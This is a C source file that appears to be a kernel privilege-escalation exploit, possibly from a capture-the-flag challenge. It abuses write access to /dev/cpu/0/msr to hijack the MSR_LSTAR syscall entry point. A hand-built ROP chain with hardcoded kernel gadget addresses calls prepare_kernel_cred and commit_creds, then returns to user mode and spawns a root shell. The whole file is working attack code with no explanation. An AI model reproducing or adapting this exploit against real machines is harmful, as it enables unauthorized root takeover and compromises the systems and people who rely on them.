#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/mman.h>


typedef uint64_t u64;
typedef uint32_t u32;
typedef uint16_t u16;
typedef uint8_t  u8;

u64 kernel_base = 0xffffffff81000000;
#define KADDR(addr) ((u64)(addr) - 0xffffffff81000000 + kernel_base)


void fatal (const char* msg) {
    perror(msg);
    exit(-1);
}

static void win() {
    setuid(0);
    setgid(0);
    if (getuid() != 0) {
        puts("[-] not root");
        exit(-1);
    }
    puts("[+] win!");
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };
    execve("/bin/sh", argv, envp);
    fatal("execve");
}

int open_file () {
    int fd = open("/dev/cpu/0/msr", O_RDWR);
    if (fd < 0)
        fatal("open");
    return fd;
}

int fd;

#define MSR_STAR                        0xc0000081
#define MSR_LSTAR                       0xc0000082
#define MSR_CSTAR                       0xc0000083
#define MSR_FMASK                       0xc0000084

static u64 rdmsr (size_t reg) {
    u64 out;
    pread(fd, &out, sizeof(out), reg);
    return out;
}

static void wrmsr (size_t reg, u64 value) {
    pwrite(fd, &value, sizeof(value), reg);
}

int main () {
    register u64 rsp asm("rsp");

    fd = open_file();

    u64 *stack = mmap(NULL, 0x1000, 7, MAP_SHARED|MAP_ANONYMOUS, -1, 0);

    u64 *rop, *ptr;

    kernel_base = rdmsr(MSR_LSTAR) - 0x800040;
    printf("kernel_base: 0x%lx\n", kernel_base);

    printf("star:  %lx\n", rdmsr(MSR_STAR));
    printf("fmask: %lx\n", rdmsr(MSR_FMASK));

    wrmsr(MSR_FMASK, rdmsr(MSR_FMASK) & ~0x40000); // Add AC flag

    rop = &stack[256];

    wrmsr(MSR_LSTAR, KADDR(0xffffffff818001d2)); // ret;_

#define POP_RDI KADDR(0xffffffff81001a28) // pop rdi; ret;

    u64 cred_addr;

    // Step 1: call prepare_kernel_cred

    ptr = &rop[0];
    *(ptr++) = KADDR(0xffffffff81801700 + 69); // paranoid_entry+69

    *(ptr++) = POP_RDI;
    *(ptr++) = KADDR(0xffffffff81e1e900); // init_task
    *(ptr++) = KADDR(0xffffffff8108b220); // prepare_kernel_cred

    *(ptr++) = KADDR(0xffffffff81801530 + 88); // swapgs_restore_regs_and_return_to_usermode+88
    *(ptr++) = 0;
    *(ptr++) = (u64)&&step1;
    *(ptr++) = 0x33;
    *(ptr++) = 0x40002;
    *(ptr++) = rsp;
    *(ptr++) = 0x2b;

    asm volatile(R"(
        push 0x40202; popf
        mov rsp, %0
        syscall)" 
        :
        : "r"(rop)
    );
step1:
    asm("nop" : "=a"(cred_addr));

    // Step 2: reset LSTAR and call commit_creds.

    u32 *wrmsr_regs = (u32*) &stack[0];

    wrmsr_regs[0] = KADDR(0xffffffff81800040) & 0xffffffff;
    wrmsr_regs[1] = MSR_LSTAR;
    wrmsr_regs[2] = KADDR(0xffffffff81800040) >> 32;

    ptr = &rop[0];
    *(ptr++) = KADDR(0xffffffff81801700 + 69); // paranoid_entry+69

    // Reset LSTAR
    *(ptr++) = POP_RDI;
    *(ptr++) = (u64)wrmsr_regs; 
    *(ptr++) = KADDR(0xffffffff81391850); // wrmsr_safe_regs

    *(ptr++) = POP_RDI;
    *(ptr++) = cred_addr;
    *(ptr++) = KADDR(0xffffffff8108b020); // commit_creds

    *(ptr++) = KADDR(0xffffffff81801530+88); // swapgs_restore_regs_and_return_to_usermode+88
    *(ptr++) = 0;
    *(ptr++) = (u64)win;
    *(ptr++) = 0x33;
    *(ptr++) = 0x40002;
    *(ptr++) = rsp;
    *(ptr++) = 0x2b;

    asm volatile(R"(
        push 0x40202; popf
        mov rsp, %0
        syscall)" 
        :
        : "r"(rop)
    );

    return 0;
}
